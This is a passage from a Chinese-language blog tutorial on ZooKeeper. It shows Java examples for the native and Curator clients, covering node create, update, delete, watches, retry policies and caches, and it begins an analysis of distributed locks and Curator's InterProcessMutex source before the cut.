<td>这是一个boolean类型的参数，用于标识当前会话是否支持只读模式。默认情况下，ZooKeeper集群中一个机器如果和集群中过半及以上机器失去了网络连接，那么这个机器将不再处理客户端请求（包括读写请求)。但是在某些使用场景下，当ZooKeeper服务器发生此类故障的时候，我们还是希望ZooKeeper服务器能够提供读服务，可以将其设置为true。</td>
</tr>
<tr>
<td>sessionId</td>
<td>会话ID</td>
</tr>
<tr>
<td>sessionPassword</td>
<td>会话秘钥，与会话ID两个参数能够唯一确定一个会话，同时客户端使用这两个参数可以实现客户端会话复用，从而达到恢复会话的效果。</td>
</tr>
</tbody></table>
<h4 id="创建节点-1"><a href="#创建节点-1" class="headerlink" title="创建节点"></a>创建节点</h4><ul>
<li>同步创建</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNode</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 通过create方法创建节点</span></span><br><span class="line">    <span class="comment">// 参数：节点路径、节点数据、ACL、节点类型</span></span><br><span class="line">    zooKeeper.create(<span class="string">&quot;/test&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;liduoan&quot;</span>.getBytes(), </span><br><span class="line">                     ZooDefs.Ids.OPEN_ACL_UNSAFE,</span><br><span class="line">                     CreateMode.PERSISTENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>异步创建</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNode</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException &#123;</span><br><span class="line">    zooKeeper.create(<span class="string">&quot;/test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;liduoan&quot;</span>.getBytes(),</span><br><span class="line">            ZooDefs.Ids.OPEN_ACL_UNSAFE,</span><br><span class="line">            CreateMode.PERSISTENT,</span><br><span class="line">            <span class="comment">// 传入异步回调接口的实现，这里选择StringCallback接口</span></span><br><span class="line">            <span class="comment">// 参数：结果返回码、节点路径、上下文、节点名称(和路径一样，除非是顺序节点)</span></span><br><span class="line">            (rc, path, ctx, name) -&gt; log.info(<span class="string">&quot;rc &#123;&#125;,path &#123;&#125;,ctx &#123;&#125;,name &#123;&#125;&quot;</span>, rc, path, ctx, name),</span><br><span class="line">            <span class="comment">// 上下文String类型</span></span><br><span class="line">            <span class="string">&quot;context&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="修改节点-1"><a href="#修改节点-1" class="headerlink" title="修改节点"></a>修改节点</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 创建一个节点状态对象，用于接收节点状态信息</span></span><br><span class="line">    <span class="type">Stat</span> <span class="variable">stat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stat</span>();</span><br><span class="line">    <span class="comment">// 通过getData方法获取节点</span></span><br><span class="line">    <span class="comment">// 参数：节点路径、Watcher监听器、节点状态对象</span></span><br><span class="line">    <span class="type">byte</span>[] data = zooKeeper.getData(<span class="string">&quot;/test&quot;</span>, <span class="literal">false</span>, stat);</span><br><span class="line">    <span class="comment">// 通过setData方法获取节点</span></span><br><span class="line">    <span class="comment">// 参数：节点路径、节点数据、版本号</span></span><br><span class="line">    zooKeeper.setData(<span class="string">&quot;/test&quot;</span>, <span class="string">&quot;liduoan&quot;</span>.getBytes(),stat.getVersion());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异步修改方式和创建一样。</p>
<h4 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 通过delete方法删除节点</span></span><br><span class="line">    <span class="comment">// 参数：节点路径、版本号(-1代表匹配所有版本号)</span></span><br><span class="line">    zooKeeper.delete(<span class="string">&quot;/test&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异步删除方式和创建一样。</p>
<h4 id="创建监听-1"><a href="#创建监听-1" class="headerlink" title="创建监听"></a>创建监听</h4><p>Zookeeper中的监听是一次性的，如果想要对同一个节点进行持续监听，每次接收到事件后都需要重新添加监听。在Zookeeper原生客户端中需要我们自己完成：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建状态对象</span></span><br><span class="line">    <span class="type">Stat</span> <span class="variable">state</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stat</span>();</span><br><span class="line">    <span class="comment">// 创建监听器</span></span><br><span class="line">    <span class="type">Watcher</span> <span class="variable">watcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Watcher</span>() &#123;</span><br><span class="line">        <span class="meta">@SneakyThrows</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(WatchedEvent event)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (event.getType() == Event.EventType.NodeDataChanged</span><br><span class="line">                    &amp;&amp; event.getState() == Event.KeeperState.SyncConnected) &#123;</span><br><span class="line">	<span class="comment">// 监听到节点数据变化后，重新添加监听</span></span><br><span class="line">                <span class="type">byte</span>[] data = zooKeeper.getData(<span class="string">&quot;/test&quot;</span>, <span class="built_in">this</span>, state);</span><br><span class="line">                log.info(<span class="string">&quot;data &#123;&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(data));     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 获取节点数据，添加监听器</span></span><br><span class="line">    <span class="type">byte</span>[] data = zooKeeper.getData(<span class="string">&quot;/test&quot;</span>, watcher, state);</span><br><span class="line">    log.info(<span class="string">&quot;data &#123;&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(data));</span><br><span class="line">    Thread.sleep(Integer.MAX_VALUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码就可以实现对<code>/test</code>节点数据的持续监听。</p>
<h3 id="Curator客户端"><a href="#Curator客户端" class="headerlink" title="Curator客户端"></a>Curator客户端</h3><p>Curator是一套由Netflix公司开源的，Java语言编程的ZooKeeper客户端框架，Curator项目是现在ZooKeeper客户端中使用最多，对ZooKeeper版本支持最好的第三方客户端，并推荐使用，Curator把我们平时常用的很多ZooKeeper服务开发功能做了封装，例如<strong>Leader选举、分布式计数器、分布式锁</strong>。</p>
<p>这就减少了技术人员在使用ZooKeeper时的大部分底层细节开发工作。在会话重新连接、Watch反复注册、多种异常处理等使用场景中，用原生的ZooKeeper处理比较复杂。而在使用 Curator 时，由于其对这些功能都做了高度的封装，使用起来更加简单，不但减少了开发时间，而且增强了程序的可靠性。 在项目中导入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--包括 curator-framework 包：该包是对ZooKeeper底层API的一些封装</span></span><br><span class="line"><span class="comment">    另一个是 curator-recipes 包：</span></span><br><span class="line"><span class="comment">该包封装了一些ZooKeeper服务的高级特性，如Cache事件监听、选举、分布式锁、分布式 Barrier--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-x-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="创建客户端实例-1"><a href="#创建客户端实例-1" class="headerlink" title="创建客户端实例"></a>创建客户端实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">zkdemo</span> &#123;</span><br><span class="line">    CuratorFramework curatorFramework;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">         <span class="comment">//创建重试策略</span></span><br><span class="line">         <span class="type">RetryPolicy</span> <span class="variable">retryPolicy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExponentialBackoffRetry</span>(<span class="number">5000</span>, <span class="number">30</span>);</span><br><span class="line">         <span class="comment">//构建者模式</span></span><br><span class="line">         curatorFramework = CuratorFrameworkFactory.builder()</span><br><span class="line">                 <span class="comment">//服务器地址</span></span><br><span class="line">                 .connectString(<span class="string">&quot;192.168.93.128:2181&quot;</span>)</span><br><span class="line">                 <span class="comment">//重试策略</span></span><br><span class="line">                 .retryPolicy(retryPolicy)</span><br><span class="line">                 <span class="comment">//会话过期事件</span></span><br><span class="line">                 .sessionTimeoutMs(<span class="number">30</span> * <span class="number">1000</span>)</span><br><span class="line">                 <span class="comment">//会话超时事件</span></span><br><span class="line">                 .connectionTimeoutMs(<span class="number">5000</span>)</span><br><span class="line">                 <span class="comment">//是否支持只读模式</span></span><br><span class="line">                 .canBeReadOnly(<span class="literal">true</span>)</span><br><span class="line">                 .build();</span><br><span class="line">         curatorFramework.getConnectionStateListenable().addListener(</span><br><span class="line">                 (Client, newState) -&gt; &#123;</span><br><span class="line">                     <span class="keyword">if</span> (newState == ConnectionState.CONNECTED) &#123;</span><br><span class="line">                         log.info(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">         );</span><br><span class="line">         <span class="comment">//启动客户端 连接服务器</span></span><br><span class="line">         curatorFramework.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建Curator客户端的参数和Zookeeper原生客户端差不多，其中多了两项</p>
<ul>
<li><strong>重试策略</strong></li>
</ul>
<table>
<thead>
<tr>
<th>策略名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ExponentialBackoffRetry</td>
<td>重试一组次数，重试之间的睡眠时间增加</td>
</tr>
<tr>
<td>RetryNTimes</td>
<td>重试最大次数</td>
</tr>
<tr>
<td>RetryOneTime</td>
<td>只重试一次</td>
</tr>
<tr>
<td>RetryUntilElapsed</td>
<td>在给定的时间结束之前重试</td>
</tr>
</tbody></table>
<p>当客户端异常退出或者与服务端失去连接的时候，可以通过设置客户端重新连接ZooKeeper服务端。</p>
<p>而 Curator 提供 一次重试、多次重试等不同种类的实现方式。</p>
<p>在Curator内部，可以通过判断服务器返回keeperException的状态代码来判断是否进行重试处理，如果返回的是<code>OK</code>表示一切操作都没有问题，而<code>SYSTEMERROR</code>表示系统或服务端错误。</p>
<ul>
<li><strong>超时时间</strong></li>
</ul>
<p>Curator客户端创建过程中，有两个超时时间的设置。一个是<code>sessionTimeoutMs</code>会话超时时间，用来设置该条会话在ZooKeeper服务端的失效时间。</p>
<p>另一个是<code>connectionTimeoutMs</code>客户端创建会话的超时时间，用来限制客户端发起一个会话连接到接收ZooKeeper服务端应答的时间。可以理解为参数<code>sessionTimeoutMs</code> 作用在服务端，而<code>connectionTimeoutMs</code>作用在客户端。</p>
<h4 id="创建节点-2"><a href="#创建节点-2" class="headerlink" title="创建节点"></a>创建节点</h4><p>Curator中采用了流式编程的风格，创建节点的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNode</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> curatorFramework</span><br><span class="line">        .create()</span><br><span class="line">        <span class="comment">// protection模式，防止由于异常导致僵尸节点</span></span><br><span class="line">        <span class="comment">// 会给节点加上一个uuid,可以失败重试并且防止多次创建</span></span><br><span class="line">        .withProtection() </span><br><span class="line">        .withMode(CreateMode.PERSISTENT)</span><br><span class="line">        <span class="comment">//节点名为/test</span></span><br><span class="line">        .forPath(<span class="string">&quot;/test&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;path &#123;&#125;&quot;</span>, path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外，Curator可以直接一次性创建带层级结构的节点，而Zookeeper原生客户端不可以：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNode</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> curatorFramework</span><br><span class="line">        .create()</span><br><span class="line">        .creatingParentsIfNeeded()</span><br><span class="line">        .withMode(CreateMode.PERSISTENT)</span><br><span class="line">        .forPath(<span class="string">&quot;/test/test-son&quot;</span>);</span><br><span class="line">    <span class="comment">//和单一节点一致的做法</span></span><br><span class="line">    log.info(<span class="string">&quot;path &#123;&#125;&quot;</span>, path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">    <span class="comment">// 在forPath之前可以通过usingWatcher添加Watcher监听，和Zookeeper原生客户端用法一致</span></span><br><span class="line">    <span class="type">byte</span>[] bytes = curatorFramework.getData().forPath(<span class="string">&quot;/test&quot;</span>); </span><br><span class="line">    log.info(<span class="string">&quot;get data from node :&#123;&#125;&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>(bytes)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="修改节点-2"><a href="#修改节点-2" class="headerlink" title="修改节点"></a>修改节点</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">    <span class="comment">//参数为 路径  数据Bytes</span></span><br><span class="line">    curatorFramework.setData().forPath(<span class="string">&quot;/test&quot;</span>,<span class="string">&quot;newdata!&quot;</span>.getBytes()); </span><br><span class="line">    <span class="type">byte</span>[] bytes = curatorFramework.getData().forPath(<span class="string">&quot;/test&quot;</span>); </span><br><span class="line">    log.info(<span class="string">&quot;get data from node :&#123;&#125;&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="删除节点-1"><a href="#删除节点-1" class="headerlink" title="删除节点"></a>删除节点</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    </span><br><span class="line">    curatorFramework</span><br><span class="line">        .delete()</span><br><span class="line">        <span class="comment">// guaranteed方法起到一个保障删除成功的作用，其底层工作方式是：</span></span><br><span class="line">        <span class="comment">// 只要该客户端的会话有效，就会在后台持续发起删除请求，直到该数据节点在服务端被删除</span></span><br><span class="line">        .guaranteed() </span><br><span class="line">        <span class="comment">// deletingChildrenIfNeeded方法以递归的方式直接删除其子节点，以及子节点的子节点...</span></span><br><span class="line">        .deletingChildrenIfNeeded()</span><br><span class="line">        <span class="comment">//对这一路径服务</span></span><br><span class="line">        .forPath(<span class="string">&quot;/test&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="异步接口"><a href="#异步接口" class="headerlink" title="异步接口"></a>异步接口</h4><p>Curator引入了<strong>BackgroundCallback</strong>接口，用来处理服务器端返回来的信息，这个处理过程是在异步线程中调用，默认在Zookeeper原生客户端的<strong>EventThread</strong>中调用，也可以自定义线程池：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testThreadPool</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">// 创建线程池</span></span><br><span class="line">    <span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 异步获取数据，可传入自定义的线程池</span></span><br><span class="line">    curatorFramework.getData()</span><br><span class="line">        .inBackground(</span><br><span class="line">        	(client, event) -&gt; &#123;</span><br><span class="line">        		log.info(<span class="string">&quot; background: &#123;&#125;&quot;</span>, event);</span><br><span class="line">    		&#125;</span><br><span class="line">        	,executorService</span><br><span class="line">    ).forPath(<span class="string">&quot;/test&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="Curator-Caches（过时）"><a href="#Curator-Caches（过时）" class="headerlink" title="Curator Caches（过时）"></a>Curator Caches（过时）</h4><p>Curator引入了Cache来实现对Zookeeper服务端事件监听，Cache事件监听可以理解为一个本地缓存视图与远程Zookeeper视图的对比过程。并且Cache提供了反复注册的功能。</p>
<p>Cache 分为两类注册类型：节点监听和子节点监听。</p>
<ul>
<li>NodeCache对某一个节点进行监听</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nodeCache</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建NodeCache</span></span><br><span class="line">    <span class="type">NodeCache</span> <span class="variable">nodeCache</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NodeCache</span>(curatorFramework, <span class="string">&quot;/test&quot;</span>);</span><br><span class="line">    <span class="comment">// 添加NodeCacheListener监听器</span></span><br><span class="line">    nodeCache.getListenable().addListener(() -&gt; &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = curatorFramework.getData().forPath(<span class="string">&quot;/test&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;data &#123;&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 启动NodeCache</span></span><br><span class="line">    nodeCache.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>PathChildrenCache 会对子节点进行监听，但是不会对二级子节点进行监听：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pathChildrenCache</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建PathChildrenCache</span></span><br><span class="line">    <span class="type">PathChildrenCache</span> <span class="variable">pathChildrenCache</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PathChildrenCache</span>(curatorFramework, <span class="string">&quot;/test&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 添加PathChildrenCacheListener监听器</span></span><br><span class="line">    pathChildrenCache.getListenable().addListener((client,event) -&gt; &#123;</span><br><span class="line">        log.info(<span class="string">&quot;event &#123;&#125;&quot;</span>, event);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 如果设置为true则在首次启动时就会缓存节点内容到Cache中</span></span><br><span class="line">    pathChildrenCache.start(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>TreeCache使用一个内部类TreeNode来维护这个一个树结构。并将这个树结构与Zookeeper节点进行了映射。所以TreeCache可以监听当前节点下所有节点的事件：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">treeCache</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建TreeCache</span></span><br><span class="line">    <span class="type">TreeCache</span> <span class="variable">treeCache</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeCache</span>(curatorFramework, <span class="string">&quot;/test&quot;</span>);</span><br><span class="line">    <span class="comment">// 添加TreeCacheListener监听器</span></span><br><span class="line">    treeCache.getListenable().addListener((client,event) -&gt; &#123;</span><br><span class="line">        log.info(<span class="string">&quot;event &#123;&#125;&quot;</span>, event);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 启动TreeCache</span></span><br><span class="line">    treeCache.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Zookeeper实战场景"><a href="#Zookeeper实战场景" class="headerlink" title="Zookeeper实战场景"></a>Zookeeper实战场景</h1><h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>与Redis一样，Zookeeper也可以实现分布式锁：</p>
<ul>
<li>Redis中通过<code>SETNX</code>命令可以保证只有一个请求可以成功设置key</li>
<li>Zookeeper中所有的节点都不能被重复创建</li>
</ul>
<p>所以说，在Zookeeper实现的分布式锁中，获取锁的过程就是创建节点的过程。</p>
<h3 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h3><p>Zookeeper实现非公平锁的流程大致如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/05/CSDR5W3EHLnXFBZ.jpg"
                      alt="Screenshot_96.jpg"
                ></p>
<p>获取锁失败的客户端，可以通过Zookeeper的事件监听机制，监听锁节点，一旦锁节点被删除就可以监听到事件，开始继续获取锁。</p>
<p>上述的实现看似很完美，但是在并发问题比较严重的情况下，性能会下降的比较厉害。</p>
<p>主要原因是，所有的连接都在对同一个节点进行监听，当服务器检测到删除事件时，要通知所有的连接，所有的连接同时收到事件，再次并发竞争，这就是<strong>羊群效应</strong>。</p>
<p>这种加锁方式是<strong>非公平锁</strong>的具体实现，非公平锁的羊群效应很难避免，那么可以采取公平锁。</p>
<h3 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h3><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>想要实现公平锁，必须要能够实现对所有客户端进行排序。</p>
<p>Redis中的List结构可以实现队列，那么对应Zookeeper中的<strong>顺序节点</strong>也可以实现排序的功能：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/05/Cq28SRIrUzmeXPk.jpg"
                      alt="Screenshot_97.jpg"
                ></p>
<ol>
<li>所有的请求到达Zookeeper后首先在锁节点下创建一个顺序节点</li>
<li>判断自己的节点是不是最小节点，如果是则获取锁成功</li>
<li>如果不是最小节点，则获取锁失败，并且<strong>监听前一个结点</strong></li>
<li>获得锁的客户端释放锁后，删除自己的顺序结点，后一个客户端会监听到该事件，重复第2步获取锁</li>
</ol>
<p>借助于临时顺序节点加上事件监听的巧妙设计，可以避免同时多个节点的并发竞争锁，缓解了服务端压力。这种实现方式所有加锁请求都进行排队加锁，是<strong>公平锁</strong>的具体实现。</p>
<h4 id="Curator源码分析"><a href="#Curator源码分析" class="headerlink" title="Curator源码分析"></a>Curator源码分析</h4><p>Curator客户端实现了公平锁，使用方法也很简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建InterProcessMutex对象，它就是公平锁类</span></span><br><span class="line"><span class="comment">// 需要传入两个参数：CuratorFramework客户端对象、lock结点名称</span></span><br><span class="line"><span class="type">InterProcessMutex</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterProcessMutex</span>(curatorFramework, <span class="string">&quot;/lock&quot;</span>);</span><br><span class="line"><span class="comment">// 获取锁，可传入超时时间，如果在指定时间内还没有获取到锁就会返回失败</span></span><br><span class="line">lock.acquire();</span><br><span class="line"><span class="comment">// 释放锁</span></span><br><span class="line">lock.release();</span><br></pre></td></tr></table></figure>

<p>接着看看<code>acquire</code>获取锁的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">acquire</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 调用internalLock方法，没有传入超时时间就是-1</span></span><br><span class="line">    <span class="keyword">if</span> ( !internalLock(-<span class="number">1</span>, <span class="literal">null</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(</span><br><span class="line">            <span class="string">&quot;Lost connection while trying to acquire lock: &quot;</span> + basePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">internalLock</span><span class="params">(<span class="type">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前线程</span></span><br><span class="line">    <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从缓存threadData尝试获取当前线程</span></span><br><span class="line">    <span class="comment">// threadData在后续有解释</span></span><br><span class="line">    <span class="type">LockData</span> <span class="variable">lockData</span> <span class="operator">=</span> threadData.get(currentThread);</span><br><span class="line">    <span class="comment">// 如果获取到了，说明是锁【重入】，不是第一次进入了</span></span><br><span class="line">    <span class="keyword">if</span> ( lockData != <span class="literal">null</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将锁的重入次数+1</span></span><br><span class="line">        lockData.lockCount.incrementAndGet();</span><br><span class="line">        <span class="comment">// 获取锁成功，直接返回</span></span><br><span class="line">    